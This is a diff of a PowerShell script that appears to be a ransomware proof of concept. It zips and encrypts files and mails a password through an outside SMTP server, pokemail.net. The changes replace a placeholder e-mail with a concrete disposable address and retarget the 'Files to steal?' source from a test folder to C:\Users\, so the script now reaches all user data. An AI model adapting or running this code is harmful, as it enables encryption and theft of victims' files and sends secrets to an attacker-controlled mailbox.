@@ -82,7 +82,7 @@ Write-Host "[+] File zipped!" -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Send password for files to your e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
-$email1 = "xxxxxxxxxxxxxxxxx@pokemail.net" # Replace $email1 with your pokemail address
+$email1 = "ydwseuoq@pokemail.net" # Replace $email1 with your pokemail address
 $ZipFolder1 = "c:\temp\backup1.zip"
 $SMTPServer = "smtp.pokemail.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
@@ -108,7 +108,7 @@ Remove-Item c:\temp\backup1.zip
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Files to steal?
 #----------------------------------------------------------------------------------------------------------------------------------------
-$Source = "c:\tools\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Source = "C:\Users\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
 $Destination = "c:\tools1\" 
 
 If (Test-Path -Path $Destination -PathType Container)
